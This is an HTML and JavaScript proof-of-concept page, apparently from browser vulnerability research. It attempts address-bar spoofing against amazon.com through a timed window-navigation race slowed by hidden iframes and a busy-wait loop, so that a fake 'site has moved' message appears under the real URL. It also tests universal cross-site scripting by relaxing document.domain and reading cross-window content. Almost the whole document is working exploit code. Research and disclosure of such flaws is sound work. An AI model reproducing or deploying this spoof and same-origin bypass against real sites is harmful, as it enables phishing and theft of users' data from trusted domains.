<!DOCTYPE html>
<html>
<head>
    <title>Tweaked Spoof PoC with UXSS Test</title>
</head>
<body>
    <a id="test" href="https://www.amazon.com/" onclick="foo()">https://www.amazon.com/</a>
</body>
<script>
var w;
var t;
var z;
if (location.href.indexOf("fake") !== -1) {
    document.body.innerHTML = "<h1>This website has moved to http://fake.com</h1>";
    
    // Pengujian impact UXSS via document.domain
    // Attempt to relax document.domain to a superdomain (e.g., for subdomain scenarios)
    // In real deployment, assume hosted on a subdomain of the victim (e.g., attacker.amazon.com)
    // This tests if document.domain can be set, potentially allowing SOP bypass in stale content during spoof
    // If successful in legacy browsers/WebViews, could lead to UXSS by relaxing origin for cross-subdomain access
    try {
        // For testing, set to a potential superdomain; adjust based on host
        // In local, may fail due to invalid domain; in production, use victim suffix
        document.domain = 'amazon.com'; // Attempt to set to victim domain for UXSS test (will fail if not suffix)
        alert("document.domain successfully relaxed to 'amazon.com' - Potential UXSS impact: Check if allows cross-origin access in spoofed context");
        console.log("Effective domain after set: " + document.domain);
        
        // Additional UXSS test: If there's a parent or opener, try access (simulate cross-subdomain)
        if (window.opener) {
            try {
                var openerBody = window.opener.document.body.innerHTML;
                alert("UXSS Success: Accessed opener document - " + openerBody.substring(0, 50));
            } catch (accessError) {
                alert("UXSS Access Failed: " + accessError.message);
            }
        }
    } catch (e) {
        alert("Failed to set document.domain: " + e.message + " - No UXSS impact via this method in this browser");
        console.log("document.domain set error: " + e);
    }
}
function foo() {
    document.getElementById("test").href = "#";
    w = window.open("?fake");
    t = setInterval(bar, 5); // Adjusted interval for better timing sync
}
function bar() {
    if (w.location.href !== 'about:blank') {
        alert("Redirecting");
        document.body.innerHTML = "<h1>Redirecting</h1>";
        slow();
        w.location.href = 'https://www.amazon.com/';
        clearInterval(t);
        z = setInterval(baz, 5);
    }
}
function baz() {
    try {
        w.location.href !== 'about:blank';
    } catch (e) {
        // Stop page loading with alternative slow 204-like endpoint
        w.location.href = 'https://www.google.com/csi';
        clearInterval(z);
        
        // Post-interruption UXSS test in opener context
        // Test if we can access the opened window's document after spoof (should fail due to cross-origin after redirect)
        try {
            var spoofedBody = w.document.body.innerHTML;
            alert("Post-spoof UXSS Success: Accessed spoofed window document - " + spoofedBody.substring(0, 50));
        } catch (accessError) {
            alert("Post-spoof UXSS Access Failed: " + accessError.message + " - SOP enforced");
        }
    }
}
// Enhanced slowdown: More iframes + CPU-intensive loop
function slow() {
    for (let i = 0; i < 50; i++) { // Increased iframes
        let iframe = document.createElement("iframe");
        iframe.src = 'https://www.amazon.com/';
        iframe.style = 'display:none';
        document.body.appendChild(iframe);
    }
    // Add CPU loop to widen race window
    let start = performance.now();
    while (performance.now() - start < 100) {} // ~100ms busy-wait
}
</script>
</html>
